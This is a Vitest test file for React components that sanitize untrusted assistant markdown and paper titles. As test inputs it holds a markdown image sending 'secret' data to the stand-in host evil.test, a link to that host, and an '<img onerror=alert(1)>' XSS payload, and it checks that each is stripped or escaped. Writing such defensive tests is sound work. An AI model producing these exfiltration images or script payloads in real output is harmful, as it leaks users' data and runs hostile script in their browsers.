import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe,it,expect } from "vitest";
import SafeAssistantMarkdown from "./SafeAssistantMarkdown";
import { HighlightSearchTitle } from "../lib/highlight-search";
describe("untrusted content rendering",()=>{
 it("does not load tracking images or expose model-generated outbound links",()=>{
  const html=renderToStaticMarkup(<SafeAssistantMarkdown>{'![secret](https://evil.test/collect?data=secret) [verify](https://evil.test) <img src=x onerror=alert(1) />'}</SafeAssistantMarkdown>);
  expect(html).not.toContain("<img");expect(html).not.toContain("href=");expect(html).not.toContain("onerror=");expect(html).toContain("verify");
 });
 it("renders malicious paper title HTML as text during highlighting",()=>{
  const html=renderToStaticMarkup(<HighlightSearchTitle title={'Research <img src=x onerror=alert(1)>'} searchValue="Research" highlightClass="match" />);
  expect(html).not.toContain("<img");expect(html).toContain("&lt;img");
 });
});
